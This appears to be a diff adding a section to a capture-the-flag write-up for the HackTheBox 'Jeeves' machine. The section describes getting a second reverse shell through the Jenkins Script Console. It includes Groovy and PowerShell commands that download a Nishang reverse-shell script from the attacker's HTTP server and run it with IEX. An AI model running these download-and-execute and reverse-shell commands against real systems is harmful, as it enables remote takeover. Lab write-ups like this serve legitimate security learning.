@@ -75,5 +75,41 @@ and wollah!
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/netcat-shell.png" alt="NetCat Shell #1">
 
+### Reverse Shell - Method #2
+
+It keeps the same concept from the Script Console and Groovy Scripting language with the difference and usage of powershell. This method came from [IppSec](https://www.youtube.com/watch?v=EKGBskG8APc) in his video resolving Jeeves, so let's get it. 
+
+So, before attempting this method, the usage of the reverse shell from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and having a simple http server from python is important.
+
+In Nishang we can add ``` Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.63 -Port 4444 ``` in the __last line__ of code as is shown in the picture below. The reason why adding this line is because at the time to execute the script in powershell we want to invoke the reverse shell to our respective IP with the respective port. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/nishang-modify.png" alt="nishang-modify">
+
+After adding that line of code, we can start our python Simple HTTP Server in our location where we have our nishang script. 
+
+```
+python -m SimpleHTTPServer 80
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/python-server.png" alt="python-server">
+
+After starting the server we should write and execute the following lines in the Script Console where our order will be to download the nishang script from our local host and executed in the remote machine invoking a reverse shell to our local host. 
+
+Groovy code for the Script Console:
+```
+cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1') """
+println cmd.execute().txt
+```
+
+Powershell script to download the nishang script (might be useful for future machinesツ) :
+```
+(New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1')
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/power-console.png" alt="power-console"
+
+So, wollah!
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/shell-gif.gif" alt="shell-gif"
 
 
